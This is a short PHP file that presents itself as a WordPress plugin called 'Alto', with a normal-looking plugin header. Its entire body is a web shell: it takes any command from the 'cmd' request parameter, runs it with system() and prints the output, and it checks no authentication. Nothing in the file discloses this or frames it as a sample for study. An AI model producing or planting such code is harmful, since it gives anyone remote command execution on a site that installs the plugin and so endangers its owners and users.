<?php
/**
 * Plugin Name: Alto
 * Plugin URI: https://wordpress.org/plugins/alto/
 * Description: Alto plugin for WordPress
 * Version: 1.0.0
 * Author: Alto Team
 * Author URI: https://alto.com
 * License: GPL v2 or later
 * Text Domain: alto
 */

if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
    exit;
}
?>